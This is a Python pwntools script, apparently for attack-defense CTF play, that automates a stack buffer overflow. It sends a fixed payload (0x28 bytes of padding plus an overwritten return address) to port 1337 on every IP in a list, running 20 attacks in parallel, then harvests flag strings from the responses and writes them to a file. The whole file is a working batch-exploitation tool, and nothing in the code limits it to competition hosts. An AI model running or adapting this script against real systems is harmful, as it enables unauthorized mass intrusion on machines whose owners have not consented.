from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import re

# 配置
context.log_level = 'info'  # 批量攻击时用info，避免debug输出过多
context.binary = binary = './pwn'
PORTS = 1337
TIMEOUT = 3
THREADS = 20
PAYLOAD = b'a' * 0x28 + p64(0x40064A)
FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
FLAG_FILE = "flag.txt"

elf = ELF(binary)
# libc = ELF('libc-2.19.so')
rop = ROP(elf)

gdbscript = '''
'''


def start(ip, port):
    """根据参数启动连接"""
    if args.GDB:
        proc = process([binary])
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        return remote(ip, port)
    else:
        return remote(ip, port)  # 批量攻击时直接远程连接


def exploit_host(ip):
    """对单个主机发送payload并提取flag"""
    # 将lambda函数定义在函数内部，使它们能访问局部的io变量
    s = lambda data: io.send(data)
    sa = lambda delim, data: io.sendafter(str(delim), data)
    sl = lambda data: io.sendline(data)
    sla = lambda delim, data: io.sendlineafter(str(delim), data)
    r = lambda num: io.recv(num)
    ru = lambda delims, drop=True: io.recvuntil(delims, drop)
    itr = lambda: io.interactive()
    uu32 = lambda data: u32(data.ljust(4, b'\x00'))
    uu64 = lambda data: u64(data.ljust(8, b'\x00'))

    try:
        io = start(ip, PORTS)
        sl(PAYLOAD)

        # 接收程序返回的响应内容
        response = b''
        try:
            response = ru(b'\n', drop=False)
        except:
            pass

        # 继续接收后续输出
        try:
            remaining = io.recvall(timeout=1)
            if remaining:
                response += remaining
        except:
            pass

        io.close()

        # 打印响应
        if response:
            print(f"[{ip}] Response: {response.decode(errors='replace')[:200]}")

        # 匹配flag
        match = FLAG_PATTERN.search(response.decode(errors='replace'))
        if match:
            flag = match.group(0)
            logging.info(f"[+] {ip} found flag: {flag}")
            return ip, flag
        else:
            logging.warning(f"[-] {ip} no flag found")
            return ip, None

    except Exception as e:
        logging.warning(f"[!] {ip} 连接失败: {str(e)}")
        return ip, None


def get_flag(ip_list):
    """并发向每个IP发送payload，提取flag"""
    flag_dict = {}

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(exploit_host, ip): ip for ip in ip_list}
        for future in as_completed(futures):
            ip, flag = future.result()
            if flag:
                flag_dict[ip] = flag

    # 写入结果文件
    if flag_dict:
        with open(FLAG_FILE, "w", encoding="utf-8") as f:
            for ip, flag in flag_dict.items():
                f.write(f"{ip}: {flag}\n")
        logging.info(f"[+] 共获取 {len(flag_dict)} 个flag，已保存到 {FLAG_FILE}")
    else:
        logging.warning("[-] 未获取到任何flag")

    return flag_dict if flag_dict else None


if __name__ == "__main__":
    # 读取IP列表并去除换行符
    with open("ip.txt", "r", encoding="utf-8") as f:
        ip_list = [line.strip() for line in f if line.strip()]

    if not ip_list:
        logging.error("[-] ip.txt为空或读取失败")
    else:
        logging.info(f"[*] 共加载 {len(ip_list)} 个目标IP")
        get_flag(ip_list)
